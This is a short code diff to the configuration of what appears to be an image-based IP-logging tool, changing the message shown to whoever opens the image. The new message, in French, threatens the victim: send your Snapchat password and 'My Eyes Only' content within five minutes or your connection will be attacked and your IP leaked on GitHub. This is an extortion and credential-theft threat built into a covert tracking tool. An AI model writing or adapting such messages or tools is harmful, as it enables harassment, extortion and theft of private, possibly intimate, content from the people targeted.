@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Your IP is {ip}", # Message to show
+        "message": "Ton IP est {ip} il te reste 5 minute pour m'envoyer ton mot de passe snapchat,my eyes only ou je fait sauter ta connexion/réseaux mobile et je fait fuité ton ip sur github merci.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
